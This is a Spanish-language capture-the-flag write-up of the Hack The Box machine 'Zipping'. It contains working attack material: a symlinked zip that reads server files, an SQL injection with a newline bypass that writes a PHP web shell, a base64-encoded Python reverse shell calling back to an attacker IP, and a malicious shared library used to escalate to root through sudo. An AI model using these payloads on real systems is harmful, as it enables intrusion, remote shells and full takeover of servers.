---
title: Zipping - Hack the Box (htb)
date: 2023-11-22 14:09:00 +0800
categories: [writeup, htb]
tags: [htb,ctf,linux,hack the box,LFI,sql injection,sqli,sudo]
math: true
mermaid: true
image:
  path: /writeup-htb-zipping/htb.png
  alt: Zipping
---

> Es un placer darles la bienvenida a un emocionante viaje por el mundo de HackTheBox. En esta ocasión, nos sumergiremos en los entresijos de la máquina Zipping, un desafío catalogado como de dificultad media y alojado en un servidor Linux. A lo largo de este fascinante recorrido, exploraremos la vulnerabilidad de Local File Inclusion (LFI) y SQl injection para obtener el flag del usuario. Como desafío final, debemos llevar a cabo una escalada de privilegios (privilege escalation), la cual se realizará mediante la explotación de los permisos sudo.  	

## Reconocimiento
Primeramente iniciamos con el escaneo de puertos mediante la herramienta `nmap`.
> Nmap es una herramienta de código abierto utilizada para explorar y mapear redes, así como para descubrir dispositivos y servicios en una red.  
{: .prompt-info }
```bash
sudo nmap 10.10.11.229 -p- -Pn -n -sS -T4 --open -oN scan1 -vvv
```
Como resultado se obtiene 2 puertos abiertos, el 22 y el 80.  
![Desktop View](/writeup-htb-zipping/nmap1.png)
_Nmap_

Para obtener mayor información de estos puertos se utilizará el siguiente comando:  
```bash
nmap 10.10.11.229 -p 22,80 -Pn -sV -sC -oN scan2
```
En el puerto `22` se está ejecutando el servicio de `ssh` y en el puerto `80` hay una página web alojada en un servidor `Apache` y cuyo nombre de la página es `Zipping | Watch Store`.  
![Desktop View](/writeup-htb-zipping/nmap2.png)
_Nmap_

## Enumeración
Teniendo la información de los puertos procedemos a realizar la enumeración.  
En el puerto `80` hay una página web de venta así que vamos a enumerar sus directorios y archivos.  
![Desktop View](/writeup-htb-zipping/web.png)
_Web_
Para enumerar los directorios y archivos utilizamos la herramienta `gobuster`.  
> Gobuster es una herramienta diseñada para la enumeración de directorios y archivos en sitios web. Su función principal es realizar ataques de fuerza bruta contra un servidor web para descubrir nombres de directorios y archivos que podrían no ser fácilmente accesibles.  
{: .prompt-info }

```bash
gobuster dir -u http://10.10.11.229 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b 403,404 -x .php,.xml,.html -r -t 100
```
Como resultado se obtienen los directorios `shop` y `assets`, también se encontró los archivos `index.php` y `upload.php`.  
![Desktop View](/writeup-htb-zipping/gobuster1.png)
_gobuster_

Como hay un directorio shop, vamos a enumerarlo para descubrir sus archivos. Con el siguiente comando logramos ese cometido.
```bash
gobuster dir -u http://10.10.11.229/shop -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b 403,404 -x .php,.xml,.html -r -t 100
```
Obtenemos como resultado los archivos `products.php`, `product.php`, `cart.php`, `home.php`, `index.php` y `functions.php`.  
![Desktop View](/writeup-htb-zipping/gobuster2.png)
_gobuster_

## Explotación
Con los archivos y directorios encontrados procedemos a revisarlos.
### Revisión del archivo upload.php
En el archivo `upload.php` se puede subir archivos `zip` los cuales deben contener un archivo `pdf`.  
![Desktop View](/writeup-htb-zipping/upload.png)
_Upload_
Subimos un archivo zip con un pdf en su interior para verificar el funcionamiento. En mi caso utilizaré el zip `prueba` y que contiene el pdf `Doc`.  
![Desktop View](/writeup-htb-zipping/upload zip.png)
_Upload zip_
El archivo se subió correctamente y se descomprimió; como adicional nos proporciona un link donde podemos ver el pdf. Un punto a tener en cuenta es que aparece el mismo nombre del pdf que se subió.  
![Desktop View](/writeup-htb-zipping/upload zip2.png)
_Upload zip_
Al hacer click en el link podemos ver el contenido del pdf.  
![Desktop View](/writeup-htb-zipping/upload respuesta.png)
_Upload respuesta_
> Con esta información podemos suponer que internamente se está ejecutando un comando que descomprime el archivo zip para así obtener el pdf, por lo tanto, hay que buscar alguna vulnerabilidad que se aproveche de esto.
{: .prompt-tip }
Buscando se encontró el siguiente artículo [**Zip/Tar File Automatically decompressed Upload**](https://book.hacktricks.xyz/pentesting-web/file-upload#zip-tar-file-automatically-decompressed-upload), donde indican que podemos aprovechar los `Symlink` para poder ver archivos del servidor, por lo tanto, estaríamos ante una vulnerabilidad de `LFI` (Local File Inclusion).  
> Local File Inclusion (LFI) es una vulnerabilidad de seguridad que ocurre cuando una aplicación web permite a un atacante incluir archivos locales, generalmente mediante la manipulación de variables de entrada que son parte de las rutas de archivo. Esta vulnerabilidad puede tener graves consecuencias, ya que un atacante puede leer archivos sensibles en el servidor, incluidos aquellos que contienen información confidencial, contraseñas o incluso el código fuente de la aplicación.
{: .prompt-info }
Para comprobar la vulnerabilidad vamos a tratar de extraer el archivo `/etc/passwd`. Para ello colocamos lo siguiente.  
```bash
ln -s ../../../../../../../etc/passwd test.pdf
```
> Donde se coloca el enlace simbólico de /etc/passwd al archivo test.pdf.
{: .prompt-info }
Luego colocamos el pdf creado en un archivo zip.
```bash
zip --symlinks test.zip test.pdf 
```
Subimos el archivo creado a la web.  
![Desktop View](/writeup-htb-zipping/upload zip3.png)
_Upload zip_
Nos proporciona el link del pdf cargado, hacemos click, sin embargo, no vemos nada, pero esto es porque los datos obtenidos no lo interpretando el pdf.  
Entonces vamos a usar la funcionalidad proxy de `Burp Suite` para ver la respuesta.  
> Burp Suite es una suite de herramientas utilizada principalmente para realizar pruebas de seguridad en aplicaciones web. Algunas de las características clave de Burp Suite incluyen: Proxy Intercept, Spider, Scanner, Repeater, Sequencer, Decoder, Comparer, Intruder ,etc.
{: .prompt-info }
Logramos ver el contenido del archivo /etc/passwd, por lo tanto, si es vulnerable a `LFI`.  
![Desktop View](/writeup-htb-zipping/respuesta burpsuite.png)
_Respuesta Burpsuite_
Hacemos los pasos anteriores, pero está vez en vez de obtener el archivo /etc/passwd, obtenemos el código de los archivos `products.php`, `product.php`, `cart.php`, `home.php`, `index.php` y `functions.php`.  
Ahora bien la ruta de  los archivos que se alojan en una web por defecto están en `/var/www/html`, sin embargo, esto puede variar, si este sería el caso podemos encontrar una lista de rutas de archivos en el siguiente enlace [**LFI-files**](https://raw.githubusercontent.com/hussein98d/LFI-files/master/list.txt).  
Nosotros vamos a utilizar la ruta `/var/www/html` y como ejemplo vamos a obtener el código de `product.php`. Como product.php se encuentra dentro del directorio shop, la ruta final sería `/var/www/html/shop/product.php`.
```bash
ln -s ../../../../../../../var/www/html/shop/product.php test5.pdf
```
```bash
zip --symlinks test5.zip test5.pdf 
```
Subimos el archivo y en burp suite se observa el código php de este archivo.  
![Desktop View](/writeup-htb-zipping/respuesta product.png)
_Respuesta product.php_
Copiamos el código obtenido y lo guardamos en un archivo aparte para analizarlo luego. Hacemos lo mismo para los demás archivos.  
### Revisión de los archivos que se encuentran en el directorio shop
Ahora vamos a analizar la página `index.php` del directorio shop, la cual presenta una lista de artículos que se puede comprar.  
![Desktop View](/writeup-htb-zipping/web index.png)
_Web index.php_
Al seleccionar un artículo el link se coloca de la siguiente manera `http://10.10.11.229/shop/index.php?page=product&id=2`.
> En ese link hay detalles muy particulares, primeramente vemos como parámetro `page` y tiene como valor `product`, podemos inferir que acá se está llamando al archivo `product.php`, por lo tanto, si cambiamos el valor product a otro nombre llamará a ese archivo, quizás acá estemos a otro caso de LFI (Local File Inclusion). Por otro lado hay otro parámetro `id` el cual tiene valor de 2 y este valor cambia si se escoge otro artículo, quizás acá haya vulnerabilidad de sql injection.  
{: .prompt-tip }
![Desktop View](/writeup-htb-zipping/web product.png)
_Web product_
Revisamos el código de index.php que hemos obtenido anteriormente y vemos que el valor del parámetro page se incluye dentro de la página index, además se valida la existencia del archivo y que sea un archivo php, por lo tanto, nosotros podemos colocar cualquier página php del servidor y acá se mostrará e interpretará.  
![Desktop View](/writeup-htb-zipping/cod index.png)
_index.php_
Para corroborar esto vamos a colocar en `page` el valor de `../upload` y debería de mostrar el contenido del upload.php.  
Verificamos que si es posible, por lo tanto, podemos mostrar cualquier archivo php del servidor.  
![Desktop View](/writeup-htb-zipping/page upload.png)
_page upload_
> Teniendo este escenario, lo que podemos hacer para obtener acceso al sistema es subir una shell de php al servidor, llamarla por medio del parámetro page y luego ya podremos digitar comandos en el sistema. 
{: .prompt-tip }
Ahora nos falta encontrar la manera de subir un archivo php al servidor.  
En el código de `product.php` se encontró una consulta sql donde se envía como parámetro el id, por lo tanto, podría ser vulnerable a sql injection. El único inconveniente es que hay validaciones mediante `preg_match`, en la cual se valida que no se coloquen letras ni caracteres especiales y además indica que el último carácter sea un número.  
![Desktop View](/writeup-htb-zipping/cod product.png)
_product.php_
Buscando como bypasear el `preg_match` se encontró el siguiente artículo [**PHP Tricks**](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp#preg_match-.), donde indican que para bypasear solo es cuestión de colocar el valor en una nueva línea y para eso usamos `%0A`.  
Una vez bypaseado el preg_match vamos a comprobar si la vulnerabilidad de sql injection está presente para ello colocamos el valor de `'` y debería arrojar un error porque la consulta sql está errónea.  
Nuestro valor final para el parámetro id sería `%0A'1`. Nota: El número 1 se coloca porque hay una validación que el último carácter sea número.  
![Desktop View](/writeup-htb-zipping/comprobacion sqli.png)
_Comprobación sqli_
En burp suite observamos que se obtuvo un internal server error, por lo tanto, es vulnerable a `sql injection`.  
> La Inyección de SQL (SQL Injection) es una vulnerabilidad de seguridad que ocurre cuando un atacante puede manipular las consultas SQL que un programa envía a su base de datos. Esta vulnerabilidad permite a un atacante ejecutar comandos SQL no deseados dentro de la aplicación, lo que puede conducir a la manipulación de datos, la revelación de información confidencial, la modificación de la estructura de la base de datos y, en algunos casos, la ejecución de comandos en el sistema operativo subyacente.  
{: .prompt-info }
![Desktop View](/writeup-htb-zipping/respuesta 500.png)
_Internal server error_
La base de datos es `mysql` porque en el código de index.php se inició un pdo a mysql. Busqué en google como guardar archivos por medio de mysql y encontré el siguiente artículo [**How to save MySQL query output to a file**](https://www.cloudhosting.lv/eng/faq/How-to-Save-MySQL-Query-Output-to-a-File), donde indican que se puede usar `select into outfile`.  
Los archivos mysql por defecto en linux/unix se guardan en la ruta  `/var/lib/mysql` o `/var/db/mysql`, entonces vamos a utilizar la primera ruta.  
Para comprobar si es posible realizar esto vamos a guardar el texto `<php echo "hola mundo" ?>` en el archivo `test.php`, por lo tanto, el valor del `id` queda de la siguiente manera.
```
%0A';select '<?php echo "hola mundo" ?>' into outfile '/var/lib/mysql/test.php'; --1
```
> Donde -\- en mysql sirve para comentar el código, por lo tanto el valor 1 no se interpretará y no habrá errores.
{: .prompt-info }
Se subió con éxito.  
![Desktop View](/writeup-htb-zipping/sql1.png)
_sql injection_
Ahora colocamos `http://10.10.11.229/shop/index.php?page=../../../../../../../../../var/lib/mysql/test` y observamos nuestro `hola mundo`.  
![Desktop View](/writeup-htb-zipping/test.png)
_test.php_
Perfecto, ahora solo necesitamos subir nuestra shell.

### Ingreso al sistema para obtener el flag del usuario
Colocamos una shell en php sencilla en el archivo test2.php, quedando el valor del `id` de la siguiente manera:  
```
%0A'; select '<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>' into outfile '/var/lib/mysql/test2.php'; --1	
```
Ejecutamos.  
![Desktop View](/writeup-htb-zipping/sql2.png)
_sql injection_
Colocamos en el navegador `http://10.10.11.229/shop/index.php?page=../../../../../../../../../var/lib/mysql/test2&cmd=id`, donde adicional de traer nuestra shell vamos a ejecutar el comando id.  
Vemos que el comando id se ejecutó correctamente.  
![Desktop View](/writeup-htb-zipping/test2.png)
_test2.php_
Ahora bien para poder ejecutar comandos desde nuestra terminal, lo que podemos hacer es colocar nuestro puerto 3222 en escucha por medio de netcat.
```bash
nc -lvnp 3222
```
En el navegador vamos a colocar el siguiente valor en el parámetro `cmd`.
```
echo "cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE0LjE2MCIsMzIyMikpO29zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpO29zLmR1cDIocy5maWxlbm8oKSwyKTtpbXBvcnQgcHR5OyBwdHkuc3Bhd24oImJhc2giKSc=" | base64 -d | bash
```
> Donde el valor del echo es: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.160",3222));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'` solo que está encodeado en base64.
{: .prompt-info }
Ejecutamos.  
![Desktop View](/writeup-htb-zipping/shell.png)
_Obtención shell_
Luego de unos segundos ya tenemos nuestra shell en nuestra terminal.  
![Desktop View](/writeup-htb-zipping/shell2.png)
_Shell_
Ahora nos dirigimos a la carpeta del usuario donde encontramos su flag.  
![Desktop View](/writeup-htb-zipping/user flag.png)
_Flag del usuario_

## Escalada de privilegios (Privilege escalation)
Como desafío final debemos de escalar privilegios para obtener el acceso a root. Realizamos la enumeración del sistema y en los permisos sudo encontramos que podemos ejecutar un archivo como root.  
Para ver los permisos sudo, digitamos el siguiente comando.  
```bash
sudo -l
```
![Desktop View](/writeup-htb-zipping/sudo -l.png)
_sudo -l_

El archivo que podemos ejecutar como sudo es `/usr/bin/stock`.  
Listamos los permisos del archivo.
```bash
ls -la /usr/bin/stock
```
Observamos que nuestro usuario actual tiene permisos de ejecución.  
![Desktop View](/writeup-htb-zipping/ls.png)
_Listar permisos_

Ejecutamos el archivo para ver que cuál es el funcionamiento de este.
```bash
/usr/bin/stock
```
Nos pide digitar un password, colocamos cualquiera y nos vota un mensaje diciendo que el password es incorrecto.  
![Desktop View](/writeup-htb-zipping/stock.png)
_Ejecución stock_

Con el comando `strings` vemos el código del programa.  
```bash
strings /usr/bin/stock
```
Aquí podemos encontrar la palabra `St0ckM4nager` que parece ser el password.  
![Desktop View](/writeup-htb-zipping/strings.png)
_strings_
Ejecutamos el programa, colocamos en el password `St0ckM4nager`, nos acepta este valor como password y nos aparece un menú para ver y editar stock.  
![Desktop View](/writeup-htb-zipping/stock2.png)
_Ejecución stock_
Listo, ahora hay que buscar una vulnerabilidad en este programa.  
Usamos el comando `strace` para ver las librerías que llama este programa y quizás por acá obtengamos una pista.
> El comando strace en Unix se utiliza para realizar un seguimiento (trace) del sistema de llamadas realizadas por un programa. Permite interceptar y registrar las llamadas al sistema y las señales que realiza un programa durante su ejecución. Esto puede ser útil para depurar problemas, entender el comportamiento de un programa, o diagnosticar problemas de rendimiento.
{: .prompt-info }
Colocamos lo siguiente para iniciar el trace.
```bash
strace /usr/bin/stock
```
Nos pedirá el password, colocamos el password y vemos algo curioso, llama a la librería `/home/rektsu/.config/libcounter.so`, la cual no existe.  
![Desktop View](/writeup-htb-zipping/strace.png)
_strace_
> Como la librería que llama `/home/rektsu/.config/libcounter.so` se encuentra dentro de la carpeta de nuestro usuario, nosotros podemos crear ese archivo y de esa manera poder escalar privilegios.
{: .prompt-tip }
Buscando como escalar privilegios mediante un archivo `.so`, logré hallar el siguiente artículo [**ld.so privesc exploit example**](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/ld.so.conf-example), donde explican el paso a paso para escalar privilegios.
- Primeramente debemos crear un archivo con extención `.c`, donde vamos a colocar el siguiente código.  
```c
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
void vuln_func()__attribute__((constructor));
void vuln_func(){
    setuid(0);
    setgid(0);
    printf("I'm the bad library\n");
    system("/bin/sh",NULL,NULL);
}
```
Este código ejecuta `/bin/sh` para obtener una shell y como esto se ejecutará con sudo lograremos obtener una shell del root.
- Ahora vamos a pasar este archivo a la máquina víctima, para ello iniciamos nuestro servidor web.
```bash
python3 -m http.server 80
```
- Descargamos el archivo en la máquina víctima.  
```bash
wget http://10.10.14.160/lib4.c
```
![Desktop View](/writeup-htb-zipping/download.png)
_Descarga archivo c_
- Generamos el archivo `libcounter.so` mediante el uso del archivo `.c`.  
```bash
gcc -shared -o /home/rektsu/.config/libcounter.so -fPIC lib4.c
```
![Desktop View](/writeup-htb-zipping/generar libcounter.png)
_certipy find_
- Por último ejecutamos el programa con sudo.
```bash
sudo /usr/bin/stock
```
Colocamos el password `St0ckM4nager` y tenemos nuestra shell como root.  
![Desktop View](/writeup-htb-zipping/stock3.png)
_Ejecución programa stock con sudo_
  
Cambiamos la shell a `/bin/bash` para más comodidad y nos dirigimos a la carpeta de root donde está nuestro flag `root.txt`.  
![Desktop View](/writeup-htb-zipping/root flag.png)
_Flag del root_
> Espero les haya gustado este post, nos vemos en una siguiente oportunidad.  
`¡Happy Hacking!` `¡You can be root!`


